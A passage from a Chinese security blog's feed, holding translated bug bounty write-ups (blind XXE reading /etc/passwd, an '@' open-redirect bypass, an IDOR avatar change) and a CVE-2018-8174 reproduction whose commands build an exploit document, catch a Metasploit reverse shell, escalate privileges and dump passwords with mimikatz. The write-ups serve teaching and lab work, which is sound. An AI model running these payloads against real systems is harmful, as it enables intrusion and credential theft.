<h4 id="emsp-emsp-通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在-file-前面添加一个-就能绕过限制"><a href="#emsp-emsp-通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在-file-前面添加一个-就能绕过限制" class="headerlink" title="&emsp;&emsp;通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在 %file 前面添加一个 : 就能绕过限制"></a>&emsp;&emsp;通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在 %file 前面添加一个 : 就能绕过限制</h4><p>[*]攻击者服务器上的evil.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;:%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/17.png" alt=""></p>
<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：From-blind-XXE-to-root-level-file-read-access&quot;&gt;&lt;a href=&quot;#原文：From-blind-XXE-to-root-level-file-read-access&quot; class=&quot;headerlink&quot; title=&quot;原文：From blind XXE to root-level file read access&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;From blind XXE to root-level file read access&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：Blind-XXE&quot;&gt;&lt;a href=&quot;#漏洞：Blind-XXE&quot; class=&quot;headerlink&quot; title=&quot;漏洞：Blind XXE&quot;&gt;&lt;/a&gt;漏洞：Blind XXE&lt;/h4&gt;&lt;h4 id=&quot;作者：Pieter&quot;&gt;&lt;a href=&quot;#作者：Pieter&quot; class=&quot;headerlink&quot; title=&quot;作者：Pieter&quot;&gt;&lt;/a&gt;作者：Pieter&lt;/h4&gt;&lt;h4 id=&quot;难度：高&quot;&gt;&lt;a href=&quot;#难度：高&quot; class=&quot;headerlink&quot; title=&quot;难度：高&quot;&gt;&lt;/a&gt;难度：高&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第二篇翻译：URL重定向</title>
    <link href="http://TimeS0ng.github.io/2018/12/19/%E7%AC%AC%E4%BA%8C%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ADevelopers-are-lazy-or-maybe-busy/"/>
    <id>http://TimeS0ng.github.io/2018/12/19/第二篇翻译：Developers-are-lazy-or-maybe-busy/</id>
    <published>2018-12-19T09:35:11.000Z</published>
    <updated>2018-12-19T10:58:18.860Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Developers-are-lazy-or-maybe-busy"><a href="#原文：Developers-are-lazy-or-maybe-busy" class="headerlink" title="原文：Developers are lazy(or maybe busy)"></a>原文：<a href="https://medium.com/bugbountywriteup/open-redirect-developers-are-lazy-or-maybe-busy-6c51718b10e4" target="_blank" rel="external">Developers are lazy(or maybe busy)</a></h4><h4 id="漏洞：-符绕过造成URL重定向"><a href="#漏洞：-符绕过造成URL重定向" class="headerlink" title="漏洞：@符绕过造成URL重定向"></a>漏洞：@符绕过造成URL重定向</h4><h4 id="作者：KatsuragiCSL"><a href="#作者：KatsuragiCSL" class="headerlink" title="作者：KatsuragiCSL"></a>作者：KatsuragiCSL</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h4 id="emsp-emsp-这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！"><a href="#emsp-emsp-这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！" class="headerlink" title="&emsp;&emsp;这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！"></a>&emsp;&emsp;这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！</h4><h4 id="emsp-emsp-我们暂且定义这个网站的域名为example-com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接："><a href="#emsp-emsp-我们暂且定义这个网站的域名为example-com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接：" class="headerlink" title="&emsp;&emsp;我们暂且定义这个网站的域名为example.com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接："></a>&emsp;&emsp;我们暂且定义这个网站的域名为example.com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.example.com/account/login?next=https://www.example.com</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-条件反射就想到了要去测试开放重定向这种类型的漏洞！"><a href="#emsp-emsp-条件反射就想到了要去测试开放重定向这种类型的漏洞！" class="headerlink" title="&emsp;&emsp;条件反射就想到了要去测试开放重定向这种类型的漏洞！"></a>&emsp;&emsp;条件反射就想到了要去测试开放重定向这种类型的漏洞！</h4><h4 id="emsp-emsp-首先，我尝试了最常规的payload：https-www-example-com-account-login-next-https-google-com-遗憾的是这个payload并没有生效，我没有被重定向到Google去！"><a href="#emsp-emsp-首先，我尝试了最常规的payload：https-www-example-com-account-login-next-https-google-com-遗憾的是这个payload并没有生效，我没有被重定向到Google去！" class="headerlink" title="&emsp;&emsp;首先，我尝试了最常规的payload：https://www.example.com/account/login?next=https://google.com   遗憾的是这个payload并没有生效，我没有被重定向到Google去！"></a>&emsp;&emsp;首先，我尝试了最常规的payload：<a href="https://www.example.com/account/login?next=https://google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://google.com</a>   遗憾的是这个payload并没有生效，我没有被重定向到Google去！</h4><h4 id="emsp-emsp-然后，我又尝试另一个payload：https-www-example-com-account-login-next-https-example-com-google-com-google-com-javascript-alert-1-不过这些花里胡哨的东西并没有任何作用"><a href="#emsp-emsp-然后，我又尝试另一个payload：https-www-example-com-account-login-next-https-example-com-google-com-google-com-javascript-alert-1-不过这些花里胡哨的东西并没有任何作用" class="headerlink" title="&emsp;&emsp;然后，我又尝试另一个payload：https://www.example.com/account/login?next=https://example.com@google.com , //google.com , javascript:alert(1)  不过这些花里胡哨的东西并没有任何作用"></a>&emsp;&emsp;然后，我又尝试另一个payload：<a href="https://www.example.com/account/login?next=https://example.com@google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://example.com@google.com</a> , //google.com , javascript:alert(1)  不过这些花里胡哨的东西并没有任何作用</h4><h4 id="emsp-emsp-最后灵犀一点，我换成这个payload之后终于有了一点反应：https-www-example-com-account-login-next-https-www-example-com-amp-next-https-google-com-但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https-example-com-2Cgoogle-com-并且浏览器还提示错误"><a href="#emsp-emsp-最后灵犀一点，我换成这个payload之后终于有了一点反应：https-www-example-com-account-login-next-https-www-example-com-amp-next-https-google-com-但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https-example-com-2Cgoogle-com-并且浏览器还提示错误" class="headerlink" title="&emsp;&emsp;最后灵犀一点，我换成这个payload之后终于有了一点反应：https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com 但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https://example.com%2Cgoogle.com 并且浏览器还提示错误"></a>&emsp;&emsp;最后灵犀一点，我换成这个payload之后终于有了一点反应：<a href="https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com</a> 但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：<a href="https://example.com%2Cgoogle.com" target="_blank" rel="external">https://example.com%2Cgoogle.com</a> 并且浏览器还提示错误</h4><h4 id="emsp-emsp-尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号-2C-连接而已"><a href="#emsp-emsp-尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号-2C-连接而已" class="headerlink" title="&emsp;&emsp;尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号(%2C)连接而已"></a>&emsp;&emsp;尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号(%2C)连接而已</h4><h4 id="emsp-emsp-所以我又构造了最终的payload：https-www-example-com-account-login-next-https-www-example-com-amp-next-google-com"><a href="#emsp-emsp-所以我又构造了最终的payload：https-www-example-com-account-login-next-https-www-example-com-amp-next-google-com" class="headerlink" title="&emsp;&emsp;所以我又构造了最终的payload：https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com"></a>&emsp;&emsp;所以我又构造了最终的payload：<a href="https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com</a></h4><h4 id="emsp-emsp-并且得到URL：https-example-com-google-com-这其实就已经将我重定向到https-www-google-com了，不信你可以访问看看"><a href="#emsp-emsp-并且得到URL：https-example-com-google-com-这其实就已经将我重定向到https-www-google-com了，不信你可以访问看看" class="headerlink" title="&emsp;&emsp;并且得到URL：https://example.com,@google.com 这其实就已经将我重定向到https://www.google.com了，不信你可以访问看看"></a>&emsp;&emsp;并且得到URL：<a href="https://example.com,@google.com" target="_blank" rel="external">https://example.com,@google.com</a> 这其实就已经将我重定向到<a href="https://www.google.com了，不信你可以访问看看" target="_blank" rel="external">https://www.google.com了，不信你可以访问看看</a></h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_2/1.gif" alt=""></p>
<h4 id="emsp-emsp-最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…"><a href="#emsp-emsp-最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…" class="headerlink" title="&emsp;&emsp;最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…."></a>&emsp;&emsp;最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词….</h4><h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：Developers-are-lazy-or-maybe-busy&quot;&gt;&lt;a href=&quot;#原文：Developers-are-lazy-or-maybe-busy&quot; class=&quot;headerlink&quot; title=&quot;原文：Developers are lazy(or maybe busy)&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/bugbountywriteup/open-redirect-developers-are-lazy-or-maybe-busy-6c51718b10e4&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Developers are lazy(or maybe busy)&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：-符绕过造成URL重定向&quot;&gt;&lt;a href=&quot;#漏洞：-符绕过造成URL重定向&quot; class=&quot;headerlink&quot; title=&quot;漏洞：@符绕过造成URL重定向&quot;&gt;&lt;/a&gt;漏洞：@符绕过造成URL重定向&lt;/h4&gt;&lt;h4 id=&quot;作者：KatsuragiCSL&quot;&gt;&lt;a href=&quot;#作者：KatsuragiCSL&quot; class=&quot;headerlink&quot; title=&quot;作者：KatsuragiCSL&quot;&gt;&lt;/a&gt;作者：KatsuragiCSL&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第一篇翻译：越权漏洞</title>
    <link href="http://TimeS0ng.github.io/2018/12/19/%E7%AC%AC%E4%B8%80%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AChange-Anyone%E2%80%99s-profile-picture-Exploiting-IDOR/"/>
    <id>http://TimeS0ng.github.io/2018/12/19/第一篇翻译：Change-Anyone’s-profile-picture-Exploiting-IDOR/</id>
    <published>2018-12-19T02:13:22.000Z</published>
    <updated>2018-12-21T04:12:45.688Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Change-Anyone’s-profile-picture-Exploiting-IDOR"><a href="#原文：Change-Anyone’s-profile-picture-Exploiting-IDOR" class="headerlink" title="原文：Change Anyone’s profile picture-Exploiting IDOR"></a>原文：<a href="https://medium.com/@rupika.luhach/change-anyones-profile-picture-exploiting-idor-41369f5acf75" target="_blank" rel="external">Change Anyone’s profile picture-Exploiting IDOR</a></h4><h4 id="漏洞：未授权更改用户信息"><a href="#漏洞：未授权更改用户信息" class="headerlink" title="漏洞：未授权更改用户信息"></a>漏洞：未授权更改用户信息</h4><h4 id="作者：Rupika-Luhach"><a href="#作者：Rupika-Luhach" class="headerlink" title="作者：Rupika Luhach"></a>作者：Rupika Luhach</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="Hello-Guys"><a href="#Hello-Guys" class="headerlink" title="Hello Guys!!"></a>Hello Guys!!</h2><h4 id="emsp-emsp-这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！"><a href="#emsp-emsp-这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！" class="headerlink" title="&emsp;&emsp;这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！"></a>&emsp;&emsp;这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！</h4><h2 id="IDOR漏洞："><a href="#IDOR漏洞：" class="headerlink" title="IDOR漏洞："></a>IDOR漏洞：</h2><h4 id="emsp-emsp-IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。"><a href="#emsp-emsp-IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。" class="headerlink" title="&emsp;&emsp;IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。"></a>&emsp;&emsp;IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。</h4><h4 id="上面是专业解释，看完接下来的漏洞复现流程自然就懂了！"><a href="#上面是专业解释，看完接下来的漏洞复现流程自然就懂了！" class="headerlink" title="[*] 上面是专业解释，看完接下来的漏洞复现流程自然就懂了！"></a>[*] 上面是专业解释，看完接下来的漏洞复现流程自然就懂了！</h4><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><h4 id="emsp-emsp-1-首先我创建了两个账号，Rupika-Luhach-作为攻击者账号，Test-User-充当受害者"><a href="#emsp-emsp-1-首先我创建了两个账号，Rupika-Luhach-作为攻击者账号，Test-User-充当受害者" class="headerlink" title="&emsp;&emsp;1. 首先我创建了两个账号，Rupika Luhach 作为攻击者账号，Test User 充当受害者"></a>&emsp;&emsp;1. 首先我创建了两个账号，<strong>Rupika Luhach</strong> 作为攻击者账号，<strong>Test User</strong> 充当受害者</h4><h4 id="emsp-emsp-2-接下来我在攻击者-Rupika-Luhach-个人首页上传一张头像，然后用burpsuit-抓包观察传递的参数信息，可以发现攻击者的ID-84。同样的方法得到受害者的ID-85"><a href="#emsp-emsp-2-接下来我在攻击者-Rupika-Luhach-个人首页上传一张头像，然后用burpsuit-抓包观察传递的参数信息，可以发现攻击者的ID-84。同样的方法得到受害者的ID-85" class="headerlink" title="&emsp;&emsp;2. 接下来我在攻击者 Rupika Luhach 个人首页上传一张头像，然后用burpsuit 抓包观察传递的参数信息，可以发现攻击者的ID=84。同样的方法得到受害者的ID=85"></a>&emsp;&emsp;2. 接下来我在攻击者 Rupika Luhach 个人首页上传一张头像，然后用burpsuit 抓包观察传递的参数信息，可以发现攻击者的ID=84。同样的方法得到受害者的ID=85</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/1.png" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/2.png" alt=""></p>
<h4 id="emsp-emsp"><a href="#emsp-emsp" class="headerlink" title="&emsp;&emsp;"></a>&emsp;&emsp;</h4><h4 id="emsp-emsp-3-重新上传攻击者的头像，然后burpsuit-抓包，将ID参数的值更改为受害者的ID–85"><a href="#emsp-emsp-3-重新上传攻击者的头像，然后burpsuit-抓包，将ID参数的值更改为受害者的ID–85" class="headerlink" title="&emsp;&emsp;3. 重新上传攻击者的头像，然后burpsuit 抓包，将ID参数的值更改为受害者的ID–85"></a>&emsp;&emsp;3. 重新上传攻击者的头像，然后burpsuit 抓包，将ID参数的值更改为受害者的ID–85</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/3.png" alt=""></p>
<h4 id="emsp-emsp-4-最后可以看到受害者Test-User的头像被篡改了"><a href="#emsp-emsp-4-最后可以看到受害者Test-User的头像被篡改了" class="headerlink" title="&emsp;&emsp;4. 最后可以看到受害者Test User的头像被篡改了"></a>&emsp;&emsp;4. 最后可以看到受害者Test User的头像被篡改了</h4><h4 id="初始头像"><a href="#初始头像" class="headerlink" title="[*] 初始头像"></a>[*] 初始头像</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/4.png" alt=""></p>
<h4 id="篡改后的头像"><a href="#篡改后的头像" class="headerlink" title="[*] 篡改后的头像"></a>[*] 篡改后的头像</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/5.png" alt=""></p>
<h2 id="视屏演示："><a href="#视屏演示：" class="headerlink" title="视屏演示："></a>视屏演示：</h2><p><video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"></video></p>
<p><source id="mp4" src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/videoplayback.mp4" type="video/mp4"><br></p>
<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：Change-Anyone’s-profile-picture-Exploiting-IDOR&quot;&gt;&lt;a href=&quot;#原文：Change-Anyone’s-profile-picture-Exploiting-IDOR&quot; class=&quot;headerlink&quot; title=&quot;原文：Change Anyone’s profile picture-Exploiting IDOR&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/@rupika.luhach/change-anyones-profile-picture-exploiting-idor-41369f5acf75&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Change Anyone’s profile picture-Exploiting IDOR&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：未授权更改用户信息&quot;&gt;&lt;a href=&quot;#漏洞：未授权更改用户信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞：未授权更改用户信息&quot;&gt;&lt;/a&gt;漏洞：未授权更改用户信息&lt;/h4&gt;&lt;h4 id=&quot;作者：Rupika-Luhach&quot;&gt;&lt;a href=&quot;#作者：Rupika-Luhach&quot; class=&quot;headerlink&quot; title=&quot;作者：Rupika Luhach&quot;&gt;&lt;/a&gt;作者：Rupika Luhach&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-8174 漏洞复现</title>
    <link href="http://TimeS0ng.github.io/2018/06/27/CVE-2018-8174-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://TimeS0ng.github.io/2018/06/27/CVE-2018-8174-漏洞复现/</id>
    <published>2018-06-27T13:24:22.000Z</published>
    <updated>2018-12-18T15:14:14.927Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。"><a href="#emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。" class="headerlink" title="&emsp;&emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。"></a>&emsp;&emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。</h4><a id="more"></a>
<h2 id="0x01-操作演示"><a href="#0x01-操作演示" class="headerlink" title="0x01. 操作演示"></a>0x01. 操作演示</h2><h4 id="1-下载EXP到kali-，生成木马文件，启动msf监听"><a href="#1-下载EXP到kali-，生成木马文件，启动msf监听" class="headerlink" title="1. 下载EXP到kali ，生成木马文件，启动msf监听"></a>1. 下载EXP到kali ，生成木马文件，启动msf监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/iBearcat/CVE-2018-8174_EXP.git</div><div class="line">cd CVE-2018-8174_EXP/</div><div class="line">python CVE-2018-8174.py -u http://192.168.1.111/exploit.html -o exploit.rtf -i 192.168.1.111 -p 4444</div><div class="line">cp exploit.html /var/www/html/</div><div class="line">service apache2 start</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">msfconsole</div><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/shell/reverse_tcp</div><div class="line">set lhost 192.168.1.111</div><div class="line">set lport 4444</div><div class="line">run</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627203521_0U5ZDx_Screenshot.jpeg" alt=""></p>
<h4 id="2-靶机访问-http-192-168-1-111-exploit-html"><a href="#2-靶机访问-http-192-168-1-111-exploit-html" class="headerlink" title="2. 靶机访问 http://192.168.1.111/exploit.html"></a>2. 靶机访问 <a href="http://192.168.1.111/exploit.html" target="_blank" rel="external">http://192.168.1.111/exploit.html</a></h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212802_F7I75O_Screenshot.jpeg" alt=""></p>
<h4 id="3-先将-shell-转换为-meterpreter-，再利用ms15-051提权"><a href="#3-先将-shell-转换为-meterpreter-，再利用ms15-051提权" class="headerlink" title="3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权"></a>3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sessions -u 2</div><div class="line">use windows/local/ms15_051_client_copy_image</div><div class="line">set session 3</div><div class="line">run</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627211559_Tkq5fo_Screenshot.jpeg" alt=""></p>
<h4 id="4-利用mimikatz-盗取明文密码"><a href="#4-利用mimikatz-盗取明文密码" class="headerlink" title="4. 利用mimikatz 盗取明文密码"></a>4. 利用mimikatz 盗取明文密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">load mimikatz</div><div class="line">msv</div><div class="line">kerberos</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212029_bxawG8_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02. 结语"></a>0x02. 结语</h2><h3 id="emsp-emsp-欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！"><a href="#emsp-emsp-欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！" class="headerlink" title="&emsp;&emsp;欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！"></a>&emsp;&emsp;欢迎大家加入我的知识星球，我会不定期的发布渗透相关教程和学习上的经验、踩过的坑！</h3><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180730172001_BDALef_Screenshot.jpeg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。&quot;&gt;&lt;a href=&quot;#emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 